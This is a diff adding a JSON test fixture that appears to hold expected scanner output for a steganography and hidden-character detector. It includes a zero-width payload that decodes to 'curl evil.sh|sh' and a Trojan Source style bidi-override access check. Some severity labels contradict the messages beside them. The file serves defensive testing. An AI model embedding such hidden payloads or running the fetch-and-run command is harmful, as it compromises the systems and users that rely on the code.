@@ -1,0 +1,149 @@
+{
+  "generated": "2026-10-30",
+  "stegguard_version": "0.4.0",
+  "deploy": {
+    "detect": {
+      "severity": "critical",
+      "lines": [
+        "\u26a0  ZERO-WIDTH CHARACTERS DETECTED \u2014 Severity: HIGH",
+        "\u2022 120 zero-width characters found",
+        "\u2022 2 distinct type(s) used",
+        "\u26a0 1/1 file(s) flagged"
+      ],
+      "exit": 1
+    },
+    "decode": {
+      "decoded": "curl evil.sh|sh",
+      "confidence": 0.9,
+      "occurrences": 120
+    },
+    "sanitize": {
+      "status": "SANITIZED",
+      "changed": true,
+      "output": "deploy.sanitized.py",
+      "changes": {
+        "zero_width_removed": 120
+      }
+    },
+    "line": "    print(\"deploying to\", env)\u200b\u200c\u200c\u200b\u200b\u200b\u200c\u200c\u200b\u200c\u200c\u200c\u200b\u200c\u200b\u200c\u200b\u200c\u200c\u200c\u200b\u200b\u200c\u200b\u200b\u200c\u200c\u200b\u200c\u200c\u200b\u200b\u200b\u200b\u200c\u200b\u200b\u200b\u200b\u200b\u200b\u200c\u200c\u200b\u200b\u200c\u200b\u200c\u200b\u200c\u200c\u200c\u200b\u200c\u200c\u200b\u200b\u200c\u200c\u200b\u200c\u200b\u200b\u200c\u200b\u200c\u200c\u200b\u200c\u200c\u200b\u200b\u200b\u200b\u200c\u200b\u200c\u200c\u200c\u200b\u200b\u200c\u200c\u200c\u200b\u200b\u200c\u200c\u200b\u200c\u200c\u200b\u200c\u200b\u200b\u200b\u200b\u200c\u200c\u200c\u200c\u200c\u200b\u200b\u200b\u200c\u200c\u200c\u200b\u200b\u200c\u200c\u200b\u200c\u200c\u200b\u200c\u200b\u200b\u200b"
+  },
+  "auth": {
+    "detect": {
+      "severity": "low",
+      "lines": [
+        "\u26a0  HOMOGLYPH CHARACTERS DETECTED \u2014 Severity: LOW",
+        "\u2022 1 homoglyph character(s) found",
+        "\u2022 1 script type(s) detected (Cyrillic/Greek/etc)",
+        "\u26a0 1/1 file(s) flagged"
+      ],
+      "exit": 1
+    },
+    "sanitize": {
+      "status": "SANITIZED",
+      "changed": true,
+      "output": "auth.sanitized.py",
+      "changes": {
+        "homoglyphs_replaced": 1
+      }
+    }
+  },
+  "access": {
+    "detect": {
+      "severity": "medium",
+      "lines": [
+        "\u26a0  OTHER SUSPICIOUS CHARACTERS DETECTED \u2014 Severity: CRITICAL",
+        "\u2022 4 suspicious control character(s) found",
+        "\u26a0 1/1 file(s) flagged"
+      ],
+      "exit": 1
+    },
+    "sanitize": {
+      "status": "SANITIZED",
+      "changed": true,
+      "output": "access.sanitized.py",
+      "changes": {
+        "bidi_removed": 4
+      }
+    },
+    "line": "    if access != \"user\u202e \u2066# Check if admin\u2069 \u2066\":"
+  },
+  "notes": {
+    "detect": {
+      "severity": "low",
+      "lines": [
+        "\u2139  TRAILING WHITESPACE DETECTED \u2014 Severity: HIGH \u26a0",
+        "\u2022 3 lines have trailing whitespace",
+        "\u26a0 1/1 file(s) flagged"
+      ],
+      "exit": 1
+    },
+    "decode": {
+      "decoded": "ok!",
+      "confidence": 0.9,
+      "bits": "011011110110101100100001"
+    },
+    "sanitize": {
+      "status": "SANITIZED",
+      "changed": true,
+      "output": "notes.sanitized.txt",
+      "changes": {
+        "trailing_whitespace_removed": 24
+      }
+    }
+  },
+  "build": {
+    "detect": {
+      "severity": "medium",
+      "lines": [
+        "\u2139  MIXED LINE ENDINGS DETECTED \u2014 Severity: MEDIUM",
+        "\u26a0 1/1 file(s) flagged"
+      ],
+      "exit": 1
+    },
+    "decode": {
+      "decoded": "hidden msg!",
+      "confidence": 0.9,
+      "bits": "0110100001101001011001000110010001100101011011100010000001101101011100110110011100100001"
+    },
+    "sanitize": {
+      "status": "SANITIZED",
+      "changed": true,
+      "output": "build.sanitized.sh",
+      "changes": {
+        "line_endings_normalized": 40
+      }
+    }
+  },
+  "image": {
+    "stego": {
+      "severity": "high",
+      "lines": [
+        "\u26a0  LSB PIXEL STEGANOGRAPHY \u2014 Verdict: LIKELY_STEGO  (confidence: 80%)",
+        "\u26a0 1/1 file(s) flagged"
+      ],
+      "exit": 1
+    },
+    "control": {
+      "severity": "clean",
+      "lines": [
+        "\u2713 LSB pixel analysis \u2014 no steganography detected  (PNG 160\u00d7160)",
+        "\u2713 All 1 file(s) clean"
+      ],
+      "exit": 0
+    },
+    "sanitize": {
+      "status": "NO_OP_UNSUPPORTED",
+      "changed": false,
+      "output": "vacation.sanitized.png",
+      "changes": {}
+    }
+  },
+  "clean": {
+    "severity": "clean",
+    "lines": [
+      "\u2713 Clean \u2014 no hidden characters found",
+      "\u2713 All 1 file(s) clean"
+    ],
+    "exit": 0
+  }
+}
